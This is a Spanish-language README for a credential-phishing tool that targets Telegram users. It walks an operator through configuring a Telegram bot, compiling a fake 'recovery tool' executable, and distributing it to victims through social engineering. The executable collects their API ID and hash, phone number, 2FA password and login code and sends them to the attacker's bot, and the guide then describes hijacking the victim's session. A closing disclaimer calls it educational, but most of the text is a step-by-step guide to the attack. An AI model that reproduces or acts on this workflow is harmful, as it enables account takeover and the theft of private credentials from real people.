# 😈 Telegram Credential Harvester (GUI Edition) 🔥

![ZeroEthical Signature](https://img.shields.io/badge/Created%20By-ZeroEthical%20%26%20Jules-black.svg)
![Language](https://img.shields.io/badge/Language-Python-blue.svg)
![License](https://img.shields.io/badge/License-Unlicensed-red.svg)

**Esta herramienta ha sido mejorada para ser más potente, fácil de usar para el operador y más convincente para la víctima. Su propósito sigue siendo el mismo: la RECOLECCIÓN ESTRATÉGICA DE CREDENCIALES mediante ingeniería social.**

## ✨ Mejoras Clave de esta Versión

*   **Interfaz Gráfica de Usuario (GUI):** Se ha reemplazado la antigua consola de texto por una interfaz de escritorio moderna y profesional (`customtkinter`), aumentando drásticamente la credibilidad de la trampa.
*   **Script de Configuración Automático (`configure.py`):** Ya no necesitas editar el código manualmente. Un script interactivo te guía para introducir tu `BOT_TOKEN` y `CHAT_ID`.
*   **Compilador Integrado:** El script de configuración ofrece compilar la herramienta en un archivo `.exe` con un solo clic, incluyendo soporte para un icono personalizado.
*   **Código Refactorizado:** El código fuente ha sido limpiado, profesionalizado y es más fácil de mantener o extender.

## 💉 Información Recolectada

Si el objetivo ejecuta el ejecutable que preparas, obtendrás:
*   **API ID** 🆔
*   **API Hash** 🔑
*   **Número de Teléfono** 📱
*   **Contraseña de Verificación en Dos Pasos (2FA)** (si se introduce) 🔒
*   **El Código de Inicio de Sesión de 5 dígitos** 🔢

## 🧠 Metodología Operativa (Nuevo Flujo de Ataque Simplificado)

1.  **Configuración (Tu Lado):**
    *   Ejecutas `python configure.py`.
    *   Introduces tu **`BOT_TOKEN`** y **`ATTACKER_CHAT_ID`**.
    *   El script te pregunta si quieres compilar. Respondes que sí (`s`).
    *   Opcionalmente, puedes añadir un archivo `icon.ico` en la misma carpeta para que el `.exe` tenga un icono personalizado.
    *   Automáticamente, se genera un archivo **`TelegramRecoveryTool.exe`** en la carpeta `dist`.

2.  **Distribución (Ingeniería Social):**
    *   Compartes `TelegramRecoveryTool.exe` con tu narrativa de engaño (una "herramienta de recuperación", etc.).

3.  **Ejecución (Lado de la Víctima):**
    *   La víctima abre el `.exe` y ve una ventana de aplicación de aspecto profesional.
    *   Introduce sus credenciales (API ID/Hash, teléfono, 2FA).

4.  **¡FASE 1 - Recolectado!**
    *   La herramienta envía estos datos a tu bot de Telegram.
    *   **¡TU ACCIÓN CRÍTICA!** Inmediatamente, usas estas credenciales en tu script `seize_telegram.py` (no incluido) para provocar que Telegram envíe el código de inicio de sesión a la víctima.

5.  **Solicitud del Código (Lado de la Víctima):**
    *   La GUI de la herramienta pasa a una segunda pantalla, pidiendo el "código de verificación final" que la víctima acaba de recibir.

6.  **¡FASE 2 - Código Obtenido!**
    *   Si la víctima introduce el código, la herramienta lo envía a tu bot.

7.  **¡Acceso Completo!**
    *   Usas el código en tu script `seize_telegram.py` para autenticarte y generar el archivo de sesión **`.session`**. ¡Control total!

## 🛠️ Requisitos

*   **Python 3+** para ejecutar el script de configuración.
*   **Librerías Python:** El script de configuración las necesita. Instálalas con:
    ```bash
    pip install requests customtkinter pyinstaller
    ```
*   **Un Bot de Telegram:** Creado con `@BotFather` para obtener tu **BOT_TOKEN**.
*   **Tu Chat ID de Telegram:** Para recibir las credenciales.
*   **(Opcional) Un archivo `icon.ico`:** Para que el `.exe` compilado sea más creíble.

## 🚀 Despliegue y Uso (El Nuevo Proceso)

1.  **Descarga** los archivos del repositorio.
2.  **Instala** las dependencias: `pip install requests customtkinter pyinstaller`.
3.  **Ejecuta el configurador:**
    ```bash
    python configure.py
    ```
4.  **Introduce tu `BOT_TOKEN` y `CHAT_ID`** cuando se te solicite.
5.  **Elige compilar** cuando se te pregunte (`s`).
6.  **Encuentra tu herramienta lista** en la carpeta `dist` (`TelegramRecoveryTool.exe`).
7.  **Distribuye** el `.exe` y espera a que las credenciales lleguen a tu bot.

## ☠️ Consideraciones Importantes (Hechos Crudos)

**El acceso no autorizado a sistemas informáticos o cuentas es ilegal en la mayoría de las jurisdicciones y conlleva graves consecuencias legales, incluyendo penas de prisión y multas.** 🚔

El uso de esta herramienta para actividades ilícitas es responsabilidad exclusiva del operador. Se proporciona con fines educativos, para demostrar cómo se realizan este tipo de ataques.

---

Desarrollado para la comprensión de los ataques de ingeniería social.
*Concepto original por **ZeroEthical**.*
